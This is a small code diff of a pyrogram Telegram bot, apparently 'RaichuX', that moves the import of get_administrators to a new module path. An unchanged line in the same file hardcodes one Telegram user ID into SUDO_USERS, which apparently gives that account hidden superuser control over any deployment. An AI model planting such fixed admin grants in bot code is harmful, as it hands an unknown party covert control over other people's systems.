@@ -5,7 +5,7 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from RaichuX import SUDO_USERS
-from helpers.admins import get_administrators
+from RaichuX.helpers.debug.admins import get_administrators
 
 SUDO_USERS.append(5046520072)
 
